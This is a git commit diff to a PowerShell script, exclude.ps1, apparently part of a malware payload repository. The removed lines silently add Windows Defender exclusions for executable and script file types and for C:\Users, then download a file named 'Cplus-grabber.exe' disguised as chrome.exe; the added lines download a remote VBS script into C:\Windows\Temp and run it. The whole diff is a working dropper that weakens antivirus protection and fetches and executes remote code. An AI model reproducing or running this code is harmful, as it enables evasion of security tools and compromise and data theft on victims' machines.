0bd32cc887cf601bf9bf9c024264942c6aa3982b
rude90 <115774095+rude90@users.noreply.github.com>
2023-12-06 18:01:19 +0500

    Update exclude.ps1

--- exclude.ps1
+++ exclude.ps1
@@ -1,6 +1,2 @@
-powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
-powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
-powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
-powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".src"
-powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Cplus-grabber.exe -o C:\Users\chrome.exe
+(New-Object System.Net.WebClient).DownloadFile("https://github.com/rude90/VBS/raw/main/test.vbs", "C:\Windows\Temp\test.vbs")
+Start-Process "C:\Windows\Temp\test.vbs"
